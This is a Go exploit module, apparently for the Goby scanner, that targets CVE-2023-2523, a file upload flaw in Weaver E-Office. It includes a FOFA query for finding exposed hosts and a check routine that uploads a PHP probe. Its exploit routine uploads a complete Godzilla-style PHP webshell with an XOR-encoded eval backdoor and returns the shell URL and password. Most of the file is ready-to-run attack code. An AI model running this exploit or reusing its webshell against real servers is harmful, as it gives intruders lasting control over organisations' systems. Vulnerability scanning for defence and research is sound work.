package exploits

import (
	"bytes"
	"crypto/md5"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"mime/multipart"
	"net/textproto"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "weaver E-Office mobile_upload_save file upload vulnerability",
    "Description": "<p>weaver e-officeOA system is a professional collaborative OA software for small and medium-sized organizations.</p><p>The mobile_upload_save module of weaver e-office has a file upload vulnerability due to improper parameter processing. Attackers can directly obtain website permissions through this vulnerability.</p>",
    "Product": "Weaver-EOffice",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2022-03-23",
    "Author": "sharecast.net@gmail.com",
    "FofaQuery": "((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\"",
    "GobyQuery": "((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. Use WAF filtering</p><p>2. Pay attention to the timely update of official patches: <a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Upload",
        "Information technology application innovation industry"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        "CVE-2023-2523"
    ],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "泛微 E-Office mobile_upload_save 组件任意文件上传漏洞",
            "Product": "泛微-EOffice",
            "Description": "<p>泛微e-officeOA系统是面向中小型组织的专业协同OA软件。</p><p>泛微e-office的mobile_upload_save模块由于参数处理不当，导致存在文件上传漏洞，攻击者可以通过该漏洞直接获取网站权限。<br></p>",
            "Recommendation": "<p>1、使用WAF过滤</p><p>2、关注官方补丁及时更新：<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传",
                "信创"
            ]
        },
        "EN": {
            "Name": "weaver E-Office mobile_upload_save file upload vulnerability",
            "Product": "Weaver-EOffice",
            "Description": "<p>weaver e-officeOA system is a professional collaborative OA software for small and medium-sized organizations.</p><p>The mobile_upload_save module of weaver e-office has a file upload vulnerability due to improper parameter processing. Attackers can directly obtain website permissions through this vulnerability.</p>",
            "Recommendation": "<p>1. Use WAF filtering<br></p><p>2. Pay attention to the timely update of official patches:&nbsp;<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload",
                "Information technology application innovation industry"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-07-22",
    "PocId": "10819"
}`
	postData1719986849 := func(shell, fieldName string, fileName string, params map[string]string) (*bytes.Buffer, string) {
		bodyBuf := &bytes.Buffer{}
		bw := multipart.NewWriter(bodyBuf)
		h := make(textproto.MIMEHeader)
		h.Set("Content-Disposition", fmt.Sprintf(`form-data; name="%s"; filename="%s"`, fieldName, fileName))
		h.Set("Content-Type", "image/jpeg")
		bodyWriter, _ := bw.CreatePart(h)
		bodyWriter.Write([]byte(shell))
		if params != nil {
			for key, val := range params {
				_ = bw.WriteField(key, val)
			}
		}

		contentType := bw.FormDataContentType()
		bw.Close()

		return bodyBuf, contentType
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save"
			randomStr := goutils.RandomHexString(8)
			shell := fmt.Sprintf("<?php echo md5('%s');unlink(__FILE__);?>", randomStr)
			fieldName := "upload_quwan"
			fileName := fmt.Sprintf("%s.jpg.php ", goutils.RandomHexString(16))
			postInfo, contentType := postData1719986849(shell, fieldName, fileName, nil)
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", contentType)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Data = postInfo.String()
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, fileName) {
					regRule := regexp.MustCompile(`attachment([^ ]+\.php)`)
					if !regRule.MatchString(resp.Utf8Html) {
						return false
					}
					filePath := strings.Replace(regRule.FindAllStringSubmatch(resp.Utf8Html, -1)[0][0], "\\", "", -1)
					shellUrl := fmt.Sprintf("%s/%s", u.FixedHostInfo, filePath)
					if resp, err := httpclient.SimpleGet(shellUrl); err == nil {
						return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, fmt.Sprintf("%x", md5.Sum([]byte(randomStr))))
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save"
			shell := `<?php
      @session_start();
      @set_time_limit(0);
      @error_reporting(0);
      function encode($D,$K){
          for($i=0;$i<strlen($D);$i++) {
              $c = $K[$i+1&15];
              $D[$i] = $D[$i]^$c;
          }
          return $D;
      }
      $pass='pass';
      $payloadName='payload';
      $key='3c6e0b8a9c15224a';
      if (isset($_POST[$pass])){
          $data=encode(base64_decode($_POST[$pass]),$key);
          if (isset($_SESSION[$payloadName])){
              $payload=encode($_SESSION[$payloadName],$key);
              if (strpos($payload,"getBasicsInfo")===false){
                  $payload=encode($payload,$key);
              }
          eval($payload);
              echo substr(md5($pass.$key),0,16);
              echo base64_encode(encode(@run($data),$key));
              echo substr(md5($pass.$key),16);
          }else{
              if (strpos($data,"getBasicsInfo")!==false){
                  $_SESSION[$payloadName]=encode($data,$key);
              }
          }
      }`
			fieldName := "upload_quwan"
			fileName := fmt.Sprintf("%s.jpg.php ", goutils.RandomHexString(16))
			postInfo, contentType := postData1719986849(shell, fieldName, fileName, nil)
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", contentType)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Data = postInfo.String()
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, fileName) {
					regRule := regexp.MustCompile(`attachment([^ ]+\.php)`)
					filePath := strings.Replace(regRule.FindAllStringSubmatch(resp.Utf8Html, -1)[0][0], "\\", "", -1)
					shellUrl := fmt.Sprintf("%s/%s", expResult.HostInfo.FixedHostInfo, filePath)
					if resp, err := httpclient.SimpleGet(shellUrl); err == nil {
						if resp.StatusCode == 200 {
							expResult.Success = true
							shellInfo := fmt.Sprintf("godzilla webshell url: %s,pass:pass,key:key", shellUrl)
							expResult.Output = shellInfo
						}
					}
				}
			}

			return expResult
		},
	))
}
